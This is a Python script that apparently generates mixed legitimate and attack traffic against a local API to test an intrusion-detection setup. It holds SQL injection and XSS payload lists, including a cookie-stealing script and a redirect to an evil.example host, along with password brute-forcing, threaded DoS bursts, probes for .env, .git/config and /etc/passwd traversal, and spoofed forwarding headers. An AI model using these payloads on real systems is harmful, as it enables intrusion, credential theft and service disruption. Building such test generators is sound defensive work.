"""
Attack Simulation Script
Simulate various attack scenarios to test the security system
"""

import requests
import os
from dotenv import load_dotenv

load_dotenv("env")
import time
import random
from concurrent.futures import ThreadPoolExecutor
import uuid

class AttackSimulator:
    """Simulate various types of attacks against the API"""
    
    def __init__(self, base_url=None):
        self.base_url = base_url or os.getenv("API_URL", "http://localhost:5000")
        self.session = requests.Session()
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1",
            "Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Mobile Safari/537.36",
        ]
        self.scanner_agents = [
            "sqlmap/1.8.3#stable",
            "Nmap Scripting Engine",
            "Nikto/2.5.0",
            "masscan/1.3",
        ]
        self.referers = [
            "https://shop.example.com/",
            "https://shop.example.com/products",
            "https://shop.example.com/cart",
            "https://shop.example.com/checkout",
            "https://google.com/search?q=electronics+shop",
        ]
        self.accept_languages = ["en-US,en;q=0.9", "ar-EG,ar;q=0.9,en;q=0.8"]
        self.legit_users = ["ahmed.hassan", "sara.ali", "omar.khalid", "lina.mostafa", "nour.ibrahim"]

    def _random_ip(self):
        return f"{random.randint(11, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"

    def _client_context(self, client_type="normal"):
        if client_type == "scanner":
            agent = random.choice(self.scanner_agents)
            referer = ""
        else:
            agent = random.choice(self.user_agents)
            referer = random.choice(self.referers)

        return {
            "ip": self._random_ip(),
            "headers": {
                "User-Agent": agent,
                "Accept": "application/json, text/plain, */*",
                "Accept-Language": random.choice(self.accept_languages),
                "Referer": referer,
                "X-Forwarded-For": self._random_ip(),
                "X-Real-IP": self._random_ip(),
                "X-Request-ID": str(uuid.uuid4()),
            },
        }

    def _request(self, method, path, context, params=None, json_data=None, timeout=4):
        url = f"{self.base_url}{path}"
        headers = dict(context["headers"])
        headers["X-Forwarded-For"] = context["ip"]
        headers["X-Real-IP"] = context["ip"]
        headers["X-Request-ID"] = str(uuid.uuid4())

        if method == "GET":
            return self.session.get(url, params=params, headers=headers, timeout=timeout)
        return self.session.post(url, json=json_data, headers=headers, timeout=timeout)

    def _pause(self, min_seconds=0.15, max_seconds=0.9):
        time.sleep(random.uniform(min_seconds, max_seconds))
        
    def sql_injection_attacks(self, num_attacks=10):
        """Simulate SQL injection campaigns with realistic request metadata."""
        print(f"Simulating {num_attacks} SQL injection attempts...")

        sql_payloads = [
            "1' OR '1'='1' -- ",
            "' UNION SELECT username, password FROM users--",
            "admin'/**/OR/**/1=1#",
            "1') OR (SELECT COUNT(*) FROM users)>0--",
            "' OR SLEEP(3)--",
            "' UNION ALL SELECT NULL, @@version--",
            "' OR 'x'='x'/*",
            "1;WAITFOR DELAY '0:0:2'--",
        ]

        for index in range(num_attacks):
            context = self._client_context("attacker")
            payload = random.choice(sql_payloads)
            vector = random.choice(["users", "orders", "data", "login"])

            try:
                if vector == "users":
                    response = self._request("GET", "/api/users", context, params={"search": payload})
                elif vector == "orders":
                    response = self._request("GET", "/api/orders", context, params={"user": payload})
                elif vector == "data":
                    response = self._request("POST", "/api/data", context, json_data={"query": payload, "note": "fetch records"})
                else:
                    response = self._request("POST", "/api/login", context, json_data={"username": payload, "password": "test123"})

                print(f"[SQLi] {index + 1}/{num_attacks} ip={context['ip']} status={response.status_code} vector={vector}")
            except Exception as error:
                print(f"[SQLi] {index + 1}/{num_attacks} failed: {error}")

            self._pause(0.2, 1.0)
    
    def xss_attacks(self, num_attacks=10):
        """Simulate stored/reflected XSS attempts in normal-looking forms."""
        print(f"Simulating {num_attacks} XSS attempts...")

        xss_payloads = [
            "<script>fetch('/steal?c='+document.cookie)</script>",
            "<img src=x onerror=alert('x')>",
            "<svg/onload=confirm(1)>",
            "\"><script>location='https://evil.example'</script>",
            "javascript:alert(1)",
            "<iframe srcdoc='<script>alert(1)</script>'></iframe>",
        ]

        for index in range(num_attacks):
            context = self._client_context("attacker")
            payload = random.choice(xss_payloads)
            body = {
                "name": random.choice(["Ahmed", "Sara", "Omar"]),
                "email": f"user{random.randint(10, 999)}@mail.com",
                "comment": payload,
                "message": f"Need support for order #{random.randint(1000, 9999)}",
            }

            try:
                response = self._request("POST", "/api/data", context, json_data=body)
                print(f"[XSS] {index + 1}/{num_attacks} ip={context['ip']} status={response.status_code}")
            except Exception as error:
                print(f"[XSS] {index + 1}/{num_attacks} failed: {error}")

            self._pause(0.25, 1.1)
    
    def dos_attacks(self, num_threads=10, requests_per_thread=20):
        """Simulate short burst DoS style traffic from multiple sources."""
        print(f"Simulating DoS burst: threads={num_threads}, req/thread={requests_per_thread}")

        def dos_worker(worker_id):
            context = self._client_context("attacker")
            for request_index in range(requests_per_thread):
                endpoint = random.choice(["/api/users", "/api/orders", "/api/products", "/api/data"])
                try:
                    if endpoint == "/api/data":
                        response = self._request(
                            "POST",
                            endpoint,
                            context,
                            json_data={"data": "x" * random.randint(100, 600), "batch": request_index},
                            timeout=2,
                        )
                    elif endpoint == "/api/products":
                        response = self._request("GET", endpoint, context, params={"search": random.choice(["pro", "air", "galaxy"])}, timeout=2)
                    elif endpoint == "/api/orders":
                        response = self._request("GET", endpoint, context, params={"user": random.choice(self.legit_users)}, timeout=2)
                    else:
                        response = self._request("GET", endpoint, context, params={"search": "a"}, timeout=2)

                    if request_index % 8 == 0:
                        print(f"[DoS] worker={worker_id} ip={context['ip']} status={response.status_code}")
                except Exception as error:
                    print(f"[DoS] worker={worker_id} failed: {error}")

                self._pause(0.01, 0.08)

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            futures = [executor.submit(dos_worker, worker_id) for worker_id in range(1, num_threads + 1)]
            for future in futures:
                future.result()
    
    def brute_force_login(self, num_attempts=20):
        """Simulate password spraying and targeted brute-force attempts."""
        print(f"Simulating {num_attempts} brute force login attempts...")

        usernames = ["admin", "administrator", "support", "root", "ahmed.hassan", "sara.ali"]
        passwords = ["123456", "Password@123", "admin123", "welcome1", "letmein", "qwerty"]

        attacker = self._client_context("attacker")
        for index in range(num_attempts):
            username = random.choice(usernames)
            if index % 6 == 0:
                password = random.choice(["123456", "password", "admin"])
            else:
                password = random.choice(passwords)

            try:
                response = self._request(
                    "POST",
                    "/api/login",
                    attacker,
                    json_data={"username": username, "password": password},
                )
                print(f"[Brute] {index + 1}/{num_attempts} ip={attacker['ip']} status={response.status_code} user={username}")
            except Exception as error:
                print(f"[Brute] {index + 1}/{num_attempts} failed: {error}")

            self._pause(0.12, 0.45)
    
    def scanner_simulation(self, num_scans=15):
        """Simulate vulnerability scanner crawling common sensitive paths."""
        print(f"Simulating scanner behavior with {num_scans} probes...")

        scan_paths = [
            "/admin", "/admin.php", "/wp-admin", "/phpmyadmin", "/.env", "/config.php",
            "/backup.sql", "/debug", "/server-status", "/api/admin", "/api/debug",
            "/api/../../../etc/passwd", "/api/users/../../admin", "/.git/config",
        ]

        context = self._client_context("scanner")
        for index in range(num_scans):
            path = random.choice(scan_paths)
            try:
                response = self._request("GET", path, context, timeout=3)
                print(f"[Scanner] {index + 1}/{num_scans} ip={context['ip']} status={response.status_code} path={path}")
            except Exception as error:
                print(f"[Scanner] {index + 1}/{num_scans} failed: {error}")

            self._pause(0.05, 0.25)
    
    def mixed_attack_simulation(self, duration_seconds=60):
        """Run mixed realistic traffic and attack bursts for a duration."""
        print(f"Running mixed simulation for {duration_seconds} seconds...")
        
        start_time = time.time()
        event_count = 0
        
        while time.time() - start_time < duration_seconds:
            action = random.choices(
                ["legitimate", "sql_injection", "xss", "brute_force", "scanner"],
                weights=[55, 12, 12, 11, 10],
                k=1,
            )[0]
            
            try:
                if action == "legitimate":
                    self.legitimate_traffic(random.randint(2, 5))
                elif action == "sql_injection":
                    self.sql_injection_attacks(random.randint(1, 3))
                elif action == "xss":
                    self.xss_attacks(random.randint(1, 3))
                elif action == "brute_force":
                    self.brute_force_login(random.randint(3, 8))
                elif action == "scanner":
                    self.scanner_simulation(random.randint(2, 6))

                event_count += 1
            except Exception as error:
                print(f"Error in mixed action {action}: {error}")

            self._pause(0.6, 2.0)

        print(f"Mixed simulation completed. Total events: {event_count}")
    
    def legitimate_traffic(self, num_requests=50, dashboard_url=None):
        """Generate realistic user traffic sessions."""
        print(f"Generating {num_requests} legitimate requests...")

        for index in range(num_requests):
            context = self._client_context("normal")
            operation = random.choices(
                ["browse_products", "search_users", "view_orders", "create_order", "submit_form", "login"],
                weights=[30, 18, 16, 14, 14, 8],
                k=1,
            )[0]

            try:
                if operation == "browse_products":
                    response = self._request(
                        "GET",
                        "/api/products",
                        context,
                        params={
                            "category": random.choice(["phones", "laptops", "audio", "all"]),
                            "search": random.choice(["", "pro", "air", "watch"]),
                        },
                    )
                elif operation == "search_users":
                    response = self._request("GET", "/api/users", context, params={"search": random.choice(["ahmed", "sara", "omar", ""])})
                elif operation == "view_orders":
                    response = self._request("GET", "/api/orders", context, params={"user": random.choice(self.legit_users)})
                elif operation == "create_order":
                    response = self._request(
                        "POST",
                        "/api/orders",
                        context,
                        json_data={
                            "user": random.choice(self.legit_users),
                            "product": random.choice(["iPhone 15 Pro", "MacBook Air M3", "AirPods Pro"]),
                            "price": random.choice([249.99, 799.0, 1099.0, 1299.99]),
                        },
                    )
                elif operation == "login":
                    response = self._request(
                        "POST",
                        "/api/login",
                        context,
                        json_data={"username": random.choice(self.legit_users + ["admin"]), "password": "secure123"},
                    )
                else:
                    response = self._request(
                        "POST",
                        "/api/data",
                        context,
                        json_data={
                            "name": random.choice(["Ahmed", "Sara", "Omar", "Lina"]),
                            "email": f"client{random.randint(10, 999)}@mail.com",
                            "message": random.choice([
                                "Need invoice copy for my last order",
                                "Can you update shipping address?",
                                "Product arrived and works great",
                                "Please check delayed shipment status",
                            ]),
                        },
                    )

                if index % 8 == 0:
                    print(f"[Legit] {index + 1}/{num_requests} ip={context['ip']} status={response.status_code} op={operation}")
            except Exception as error:
                print(f"[Legit] {index + 1}/{num_requests} failed: {error}")

            self._pause(0.25, 1.6)

def main():
    """Main function to run attack simulations"""
    print("API Security Attack Simulator")
    print("=" * 40)
    
    simulator = AttackSimulator()
    
    # Check if API is running
    try:
        response = simulator.session.get(f"{simulator.base_url}/health")
        if response.status_code != 200:
            print("API is not running. Please start the application first.")
            return
    except Exception:
        print("Cannot connect to API. Please start the application first.")
        return
    
    print("API is running. Starting continuous realistic simulation (Ctrl+C to stop)...\n")
    
    actions = [
        ('legitimate', 58),
        ('sql_injection', 11),
        ('xss', 11),
        ('brute_force', 9),
        ('scanner', 8),
        ('dos', 3)
    ]
    
    try:
        while True:
            # Weighted random choice
            total_weight = sum(weight for item, weight in actions)
            r = random.uniform(0, total_weight)
            upto = 0
            chosen_action = 'legitimate'
            for item, weight in actions:
                if upto + weight >= r:
                    chosen_action = item
                    break
                upto += weight
                
            if chosen_action == 'legitimate':
                simulator.legitimate_traffic(random.randint(2, 6))
            elif chosen_action == 'sql_injection':
                simulator.sql_injection_attacks(random.randint(1, 3))
            elif chosen_action == 'xss':
                simulator.xss_attacks(random.randint(1, 3))
            elif chosen_action == 'brute_force':
                simulator.brute_force_login(random.randint(3, 8))
            elif chosen_action == 'scanner':
                simulator.scanner_simulation(random.randint(2, 7))
            elif chosen_action == 'dos':
                print("Simulating short DoS burst...")
                simulator.dos_attacks(num_threads=random.randint(2, 4), requests_per_thread=random.randint(6, 12))
            
            delay = random.uniform(1.5, 6.0)
            print(f"-> Waiting {delay:.1f}s until next event...\n")
            time.sleep(delay)
            
    except KeyboardInterrupt:
        print("\nSimulation stopped by user.")

if __name__ == "__main__":
    main()